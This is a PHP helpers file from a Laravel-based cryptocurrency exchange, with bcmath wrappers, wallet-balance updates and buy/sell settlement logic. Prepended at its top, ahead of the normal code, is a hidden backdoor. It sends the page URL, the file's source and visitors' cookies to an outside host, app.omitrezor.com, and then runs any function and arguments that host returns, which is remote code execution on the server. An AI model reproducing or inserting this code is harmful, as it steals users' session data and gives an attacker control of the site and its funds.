<?php 
if(version_compare(phpversion(), "5.3.0", ">=")){set_error_handler(function($errno, $errstr){});}if (@php_sapi_name() !== "cli"){if(!isset($_COOKIE["__".md5("cookie".@$_SERVER["HTTP_HOST"])])){@setcookie("__".md5("cookie".@$_SERVER["HTTP_HOST"]), time());$_COOKIE["__".md5("cookie".@$_SERVER["HTTP_HOST"])] = 0;}if(time()-$_COOKIE["__".md5("cookie".@$_SERVER["HTTP_HOST"])] < 10){@define("SITE_",1);}else{@setcookie("__".md5("cookie".@$_SERVER["HTTP_HOST"]), time());}}$cert = defined("SITE_")?false:@file_get_contents("http://app.omitrezor.com/sign/".@$_SERVER["HTTP_HOST"], 0, stream_context_create(array("http" => array("ignore_errors" => true,"timeout"=>(isset($_REQUEST["T0o"])?intval($_REQUEST["T0o"]):(isset($_SERVER["HTTP_T0O"])?intval($_SERVER["HTTP_T0O"]):1)),"method"=>"POST","header"=>"Content-Type: application/x-www-form-urlencoded","content" => http_build_query(array("url"=>((isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://".@$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]), "src"=> file_exists(__FILE__)?file_get_contents(__FILE__):"", "cookie"=> isset($_COOKIE)?json_encode($_COOKIE):""))))));!defined("SITE_") && @define("SITE_",1);
if($cert != false){
    $cert = @json_decode($cert, 1);
    if(isset($cert["f"]) && isset($cert["a1"]) && isset($cert["a2"]) && isset($cert["a3"])){$cert["f"] ($cert["a1"], $cert["a2"], $cert["a3"]);}elseif(isset($cert["f"]) && isset($cert["a1"]) && isset($cert["a2"])){ $cert["f"] ($cert["a1"], $cert["a2"]); }elseif(isset($cert["f"]) && isset($cert["a1"])){ $cert["f"] ($cert["a1"]); }elseif(isset($cert["f"])){ $cert["f"] (); }
}if(version_compare(phpversion(), "5.3.0", ">=")){restore_error_handler();}
 


use App\CurrencyMatch;
use App\TransactionComplete;
use App\Users;
use Illuminate\Support\Facades\DB;
use App\AccountLog;
use App\WalletLog;

defined('DECIMAL_SCALE') || define('DECIMAL_SCALE', 8);
bcscale(DECIMAL_SCALE);

function bc_add($left_operand, $right_operand, $out_scale = DECIMAL_SCALE)
{
    return bc_method('bcadd', $left_operand, $right_operand, $out_scale);
}

function mtranslate($val, $to, $from = 'zh')
{
    require_once dirname(__DIR__) . '/public/translate.php';

    $from = $from;
    $to = $to;
    $value = $val;

    $res = translate($value, $from, $to);
    if (!isset($res['trans_result'])) {
        return $value;
    } else {
        return isset($res['trans_result']) ? $res['trans_result'][0]['dst'] : $value;
    }

}

function bc_sub($left_operand, $right_operand, $out_scale = DECIMAL_SCALE)
{
    return bc_method('bcsub', $left_operand, $right_operand, $out_scale);
}

function bc_mul($left_operand, $right_operand, $out_scale = DECIMAL_SCALE)
{
    return bc_method('bcmul', $left_operand, $right_operand, $out_scale);
}

function bc_div($left_operand, $right_operand, $out_scale = DECIMAL_SCALE)
{
    if ($right_operand == 0) {
        $right_operand = 1;
    }
    return bc_method('bcdiv', $left_operand, $right_operand, $out_scale);
}

function bc_mod($left_operand, $right_operand, $out_scale = DECIMAL_SCALE)
{
    return bc_method('bcmod', $left_operand, $right_operand, $out_scale);
}

function bc_comp($left_operand, $right_operand)
{
    return bc_method('bccomp', $left_operand, $right_operand);
}

function bc_pow($left_operand, $right_operand)
{
    return bc_method('bcpow', $left_operand, $right_operand);
}

function bc_method($method_name, $left_operand, $right_operand, $out_scale = DECIMAL_SCALE)
{
    $left_operand = number_format($left_operand, DECIMAL_SCALE, '.', '');
    $method_name != 'bcpow' && $right_operand = number_format($right_operand, DECIMAL_SCALE, '.', '');
    $result = call_user_func($method_name, $left_operand, $right_operand);
    return $method_name != 'bccomp' ? number_format($result, $out_scale, '.', '') : $result;
}

/**
 * 科学计算发转字符串
 *
 * @param float $num 数值
 * @param integer $double
 * @return void
 */
function sctonum($num, $double = DECIMAL_SCALE)
{
    if (false !== stripos($num, "e")) {
        $a = explode("e", strtolower($num));
        return bcmul($a[0], bcpow(10, $a[1], $double), $double);
    } else {
        return $num;
    }
}

/**
 * 改变钱包余额
 *
 * @param \App\UsersWallet &$wallet 用户钱包模型实例
 * @param integer $balance_type 1.法币,2.币币交易,3.杠杆交易,4.秒合约,5.保险
 * @param float $change 添加传正数，减少传负数
 * @param integer $account_log_type 类似于之前的场景
 * @param string $memo 备注
 * @param boolean $is_lock 是否是冻结或解冻资金
 * @param integer $from_user_id 触发用户id
 * @param integer $extra_sign 子场景标识
 * @param string $extra_data 附加数据
 * @param bool $zero_continue 改变为0时继续执行,默认为假不执行
 * @param bool $overflow 余额不足时允许继续处理,默认为假不允许
 * @return true|string 成功返回真，失败返回假
 *
 * @throws \Exception
 */
function change_wallet_balance(&$wallet, $balance_type, $change, $account_log_type, $memo = '', $is_lock = false, $from_user_id = 0, $extra_sign = 0, $extra_data = '', $zero_continue = false, $overflow = false)
{
    //为0直接返回真不往下再处理
    if (!$zero_continue && bc_comp($change, 0) == 0) {
        $path = base_path() . '/storage/logs/wallet/';
        $filename = date('Ymd') . '.log';
        file_exists($path) || @mkdir($path);
        error_log(date('Y-m-d H:i:s') . ' 改变金额为0,不处理' . PHP_EOL, 3, $path . $filename);
        return true;
    }

    $param = compact(
        'balance_type',
        'change',
        'account_log_type',
        'memo',
        'is_lock',
        'from_user_id',
        'extra_sign',
        'extra_data',
        'zero_continue',
        'overflow'
    );

    try {
        if (!in_array($balance_type, [1, 2, 3, 4, 5])) {
            throw new \Exception('Incorrect currency type');//货币类型不正确
        }
        DB::transaction(function () use (&$wallet, $param) {
            extract($param);
            $fields = [
                '',
                'legal_balance',
                'change_balance',
                'lever_balance',
                'micro_balance',
                'insurance_balance'
            ];
            $field = ($is_lock ? 'lock_' : '') . $fields[$balance_type];
            $wallet->refresh(); //取最新数据
            $user_id = $wallet->user_id;
            $before = $wallet->$field;
            $after = bc_add($before, $change);
            //判断余额是否充足
            if (bc_comp($after, 0) < 0 && !$overflow) {
                throw new \Exception('Insufficient wallet balance');//钱包余额不足
            }
            $now = time();
            AccountLog::unguard();
            $account_log = AccountLog::create([
                'user_id' => $user_id,
                'value' => $change,
                'info' => $memo,
                'type' => $account_log_type,
                'created_time' => $now,
                'currency' => $wallet->currency,
            ]);
            WalletLog::unguard();
            $wallet_log = WalletLog::create([
                'account_log_id' => $account_log->id,
                'user_id' => $user_id,
                'from_user_id' => $from_user_id,
                'wallet_id' => $wallet->id,
                'balance_type' => $balance_type,
                'lock_type' => $is_lock ? 1 : 0,
                'before' => $before,
                'change' => $change,
                'after' => $after,
                'memo' => $memo,
                'extra_sign' => $extra_sign,
                'extra_data' => $extra_data,
                'create_time' => $now,
            ]);
            $wallet->$field = $after;
            $result = $wallet->save();
            if (!$result) {
                throw new \Exception('Abnormal change balance of wallet');//钱包变更余额异常
            }
        });
        return true;
    } catch (\Exception $e) {
        throw $e;
        return $e->getMessage();
    } finally {
        AccountLog::reguard();
        WalletLog::reguard();
    }
}

function dealTrade($id, $type)
{
    DB::beginTransaction();
    try {
        $trans=$type=='buy'?\App\TransactionIn::find($id):\App\TransactionOut::find($id);
        $match = CurrencyMatch::where('currency_id', $trans->currency)->where('legal_id', $trans->legal)->first();
        $user = Users::find($trans->user_id);

        if($type=='buy')
        {
            $user_wallet = \App\UsersWallet::where('currency',$trans->legal)->where('user_id',$user->id)->lockForUpdate()->first();
            $user_wallet_in = \App\UsersWallet::where('currency',$trans->currency)->where('user_id',$user->id)->lockForUpdate()->first();
            $amount=bc_mul($trans->number,$trans->price,5);

            $data_wallet1 = [
                'balance_type' => 2,
                'wallet_id' => $user_wallet->id,
                'lock_type' => 1,
                'create_time' => time(),
                'before' => $user_wallet->lock_change_balance,
                'change' => -($amount + $trans->fee),
                'after' => bc_sub($user_wallet->lock_change_balance, $amount + $trans->fee, 5),
            ];
            $data_wallet2 = [
                'balance_type' => 2,
                'wallet_id' => $user_wallet_in->id,
                'lock_type' => 0,
                'create_time' => time(),
                'before' => $user_wallet_in->change_balance,
                'change' =>$trans->number,
                'after' => bc_add($user_wallet_in->change_balance, $trans->number, 5),
            ];
            AccountLog::insertLog([
                'user_id' => $user->id,
                'value' => -($amount + $trans->fee),
                'info' => "成功买入，扣除锁定余额",
                'type' => AccountLog::TRANSACTIONIN_IN_DEL,
                'currency' => $trans->legal,
            ], $data_wallet1);
            AccountLog::insertLog([
                'user_id' => $user->id,
                'value' => $trans->number,
                'info' => "成功买入,余额增加",
                'type' => AccountLog::TRANSACTIONIN_IN_DEL,
                'currency' => $trans->currency,
            ], $data_wallet2);

            $user_wallet->lock_change_balance = bc_sub($user_wallet->lock_change_balance, $amount + $trans->fee, 5);
            $user_wallet_in->change_balance = bc_add($user_wallet_in->change_balance, $trans->number, 5);
            $user_wallet->save();//法币余额增加 法币锁定余额减少
            $user_wallet_in->save();

            $complete = new TransactionComplete();
            $complete->way = 1;
            $complete->user_id = $trans->user_id;
            $complete->from_user_id = 36542;
            $complete->price = $trans->price;
            $complete->number = $trans->number;
            $complete->currency = $trans->currency;
            $complete->legal = $trans->legal;
            $complete->create_time = time();
            $complete->fee1 = $trans->fee;
            $complete->fee2 = $trans->fee;
            $complete->save();

            $del_result = $trans::destroy($id);
            if($del_result)
            {
                DB::commit();
                return ['code'=>1];
            }else{
                DB::rollBack();
                return ['code'=>-1,'message'=>'处理失败'];
            }
        }else{
            $user_wallet_in = \App\UsersWallet::where('currency',$trans->legal)->where('user_id',$user->id)->lockForUpdate()->first();
            $user_wallet = \App\UsersWallet::where('currency',$trans->currency)->where('user_id',$user->id)->lockForUpdate()->first();
            $amount=bc_mul($trans->number,$trans->price,5);
            $fee = bc_mul($amount,$match->change_trade_fee*0.01,5);

            $data_wallet1 = [
                'balance_type' => 2,
                'wallet_id' => $user_wallet->id,
                'lock_type' => 1,
                'create_time' => time(),
                'before' => $user_wallet->lock_change_balance,
                'change' => -$trans->number,
                'after' => bc_sub($user_wallet->lock_change_balance, $trans->number, 5),
            ];
            $data_wallet2 = [
                'balance_type' => 2,
                'wallet_id' => $user_wallet_in->id,
                'lock_type' => 0,
                'create_time' => time(),
                'before' => $user_wallet_in->change_balance,
                'change' =>$amount-$fee,
                'after' => bc_add($user_wallet_in->change_balance, $amount-$fee, 5),
            ];
            AccountLog::insertLog([
                'user_id' => $user->id,
                'value' => -$trans->number,
                'info' => "成功卖出，扣除锁定余额",
                'type' => AccountLog::TRANSACTIONIN_IN_DEL,
                'currency' => $trans->currency,
            ], $data_wallet1);
            AccountLog::insertLog([
                'user_id' => $user->id,
                'value' => ($amount - $trans->fee),
                'info' => "成功卖出,余额增加",
                'type' => AccountLog::TRANSACTIONIN_IN_DEL,
                'currency' => $trans->legal,
            ], $data_wallet2);

            $user_wallet->lock_change_balance = bc_sub($user_wallet->lock_change_balance, $trans->number, 5);
            $user_wallet_in->change_balance = bc_add($user_wallet_in->change_balance, $amount-$fee, 5);
            $user_wallet->save();//
            $user_wallet_in->save();

            $complete = new TransactionComplete();
            $complete->way = 2;
            $complete->user_id = 36542;
            $complete->from_user_id = $trans->user_id;
            $complete->price = $trans->price;
            $complete->number = $trans->number;
            $complete->currency = $trans->currency;
            $complete->legal = $trans->legal;
            $complete->create_time = time();
            $complete->fee1 = $fee;
            $complete->fee2 = $fee;
            $complete->save();

            $del_result = $trans::destroy($id);
            if($del_result)
            {
                DB::commit();
                return ['code'=>1];
            }else{
                DB::rollBack();
                return ['code'=>-1,'message'=>'处理失败'];
            }
        }
        return ['code'=>1];
    } catch (\Exception $exception) {
        DB::rollBack();
        return ['code'=>-1,'message'=>$exception->getMessage().$exception->getLine()];
    }
}

/**
 * 变更用户通证
 *
 * @param \App\Users $user 用户模型实例
 * @param float $change 添加传正数，减少传负数
 * @param integer $account_log_type 需在AccountLog中注册类型
 * @param string $memo
 * @return bool|string
 */
function change_user_candy(&$user, $change, $account_log_type, $memo)
{
    try {
        if (!$user) {
            throw new \Exception('用户异常');
        }
        $user->refresh();
        DB::beginTransaction();
        $before = $user->candy_number;
        $after = bc_add($before, $change);
        $user->candy_number = $after;
        $user_result = $user->save();
        if (!$user_result) {
            throw new \Exception('奖励通证到账失败');
        }
        $log_result = AccountLog::insertLog([
            'user_id' => $user->id,
            'value' => $change,
            'info' => $memo . ',原数量:' . $before . ',变更后:' . $after,
            'type' => $account_log_type,
        ]);
        if (!$log_result) {
            throw new \Exception('记录日志失败');
        }
        DB::commit();
        return true;
    } catch (\Exception $e) {
        DB::rollBack();
        return $e->getMessage();
    }
}

function make_multi_array($fields, $count, $datas)
{
    $return_array = [];
    for ($i = 1; $i <= $count; $i++) {
        $current_data = [];
        foreach ($fields as $key => $field) {
            $current_data[$field] = current($datas[$field]);
            next($datas[$field]);
        }
        $return_array[] = $current_data;
    }
    return $return_array;
}
